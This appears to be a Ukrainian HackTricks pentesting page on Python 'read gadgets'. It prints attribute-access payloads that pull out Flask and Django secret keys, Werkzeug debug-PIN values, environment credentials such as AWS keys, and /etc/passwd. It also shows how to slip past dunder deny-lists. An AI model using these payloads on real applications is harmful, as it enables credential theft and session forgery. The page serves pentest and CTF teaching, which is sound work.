# Python Internal Read Gadgets

## Основна інформація

Різні вразливості, такі як [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) або [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), можуть дозволити вам **читати внутрішні дані Python, але не дозволять виконувати код**. Тому pentester повинен максимально використати ці дозволи на читання, щоб **отримати чутливі привілеї та підвищити рівень вразливості**.

### Flask - Читання secret key

Головна сторінка Flask-застосунку, ймовірно, матиме глобальний об’єкт **`app`**, у якому налаштовано цей **secret**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
У цьому випадку отримати доступ до цього об’єкта можна, використовуючи будь-який gadget для **доступу до глобальних об’єктів** зі сторінки [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

Якщо **вразливість знаходиться в іншому файлі Python**, потрібен gadget для обходу файлів, щоб дістатися до основного файлу, **отримати доступ до глобального об’єкта `app.secret_key`** і мати змогу [**підвищити привілеї** за допомогою цього ключа](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload на кшталт цього [з цього writeup](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Використайте цей payload, щоб **прочитати `app.secret_key`**. Якщо оригінальна вразливість також надає вам примітив запису (наприклад, class pollution), той самий шлях можна використати, щоб замінити його та підписувати привілейованіші Flask cookies.

### Werkzeug - machine_id and node uuid

[**Використовуючи ці payloads із цього writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) ви зможете отримати доступ до **machine_id** і **uuid** node — це **приватні біти**, необхідні для [**генерування Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) і доступу до python console у `/console`, якщо **debug mode увімкнено**:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Зверніть увагу, що можна отримати **локальний шлях сервера до `app.py`**, згенерувавши певну **помилку** на вебсторінці, яка **надасть вам цей шлях**.

Якщо вразливість міститься в іншому python-файлі, скористайтеся попереднім Flask-трюком, щоб отримати доступ до об’єктів з основного python-файлу.

### Django - SECRET_KEY і settings module

Об’єкт налаштувань Django кешується в `sys.modules` після запуску застосунку. Маючи лише примітиви читання, можна отримати **`SECRET_KEY`**, резервні ключі, облікові дані бази даних або солі підпису:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Якщо вразливий gadget знаходиться в іншому модулі, спочатку перевірте globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` так само цінні, як і поточний `SECRET_KEY`: вони й надалі перевіряють старі підписані значення під час ротації.<sup>[[1]](#references)</sup> Також отримайте `SESSION_ENGINE` і `SESSION_SERIALIZER`, щоб швидко визначити, чи вплив обмежується підробленням cookie, чи є щось серйозніше. Докладніше про вплив на вебзастосунок див. на сторінці [**Django pentesting**](../../network-services-pentesting/pentesting-web/django.md).

### Gadgets завантажувача модулів — читання вихідного коду та файлів

Завантажені Python-модулі зазвичай зберігають `__loader__`. Завантажувачі, що працюють із файлами, часто надають `get_source()` і `get_data()`, які є ідеальними **примітивами лише для читання**, коли ви вже можете отримати доступ до об’єкта модуля, але не до `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Це дуже корисно для отримання **config modules, blueprints, helper files або hidden routes** і вилучення API keys, DSNs, шляхів до flag або додаткових точок входу gadget.

Якщо у вас є лише перелік subclass, шукайте loader за назвою, а не жорстко задавайте індекс:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Глобальні змінні frame генератора / coroutine

Якщо ви можете створити об’єкт generator/coroutine або отримати до нього доступ, його frame може leak глобальні змінні **без необхідності використовувати gadget `__globals__` будь-якої функції**. Це корисно проти фільтрів, які блокують лише dunder names і не враховують такі атрибути frame, як `gi_frame`, `ag_frame`, `cr_frame` або `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Отримавши frame globals, продовжуйте точно так само, як і в інших gadgets (`sys.modules`, settings objects, `os.environ` тощо). Останні sandbox escapes знову й знову виявляють цю проблему, оскільки `gi_frame` і `f_globals` не є dunder attributes і часто переживають наївні deny-lists.

### Змінні середовища / cloud creds через завантажені modules

У багатьох jails десь усе ще імпортується `os` або `sys`. Можна зловживати будь-якою доступною функцією `__init__.__globals__`, щоб перейти до вже імпортованого module `os` і вивести **змінні середовища**, що містять API-токени, cloud keys або flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Якщо індекс підкласу відфільтровано, використовуйте loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Змінні середовища часто є єдиними секретами, необхідними для переходу від read до повної компрометації (cloud IAM keys, database URLs, signing keys тощо).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), вразливі версії `<0.61.0`) допускав **class pollution** через спеціально сформовані component requests. Property path на кшталт `__init__.__globals__` міг отримати доступ до globals component-модуля та імпортованих модулів; advisory демонструє перезапис Django's `SECRET_KEY` і значень у `os.environ`, а не лише read-only exploit.<sup>[[5]](#references)</sup> Якщо окрема помилка надає read access до того самого object graph, ці globals можуть розкрити configuration і credentials без необхідності code execution.

### Gadget collections for chaining

Недавні CTF та дослідження pyjail демонструють надійні read chains, побудовані лише на attribute access і subclass enumeration. Підтримувані спільнотою списки, такі як [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), каталогізують сотні мінімальних gadgets, які можна комбінувати для переходу від objects до `__globals__`, `sys.modules` і зрештою до sensitive data.<sup>[[2]](#references)</sup> Надавайте перевагу пошуку за **attribute/name** замість raw subclass indexes, оскільки позиція `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` тощо змінюється між версіями Python і за наявності додаткових імпортованих бібліотек.

## References

- [1] [Документація Django щодо cryptographic signing](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – wiki gadgets для Python sandbox](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – writeup FCSC 2023](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Уразливість Django-Unicorn Class Pollution, що призводить до RCE, XSS, DoS і Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
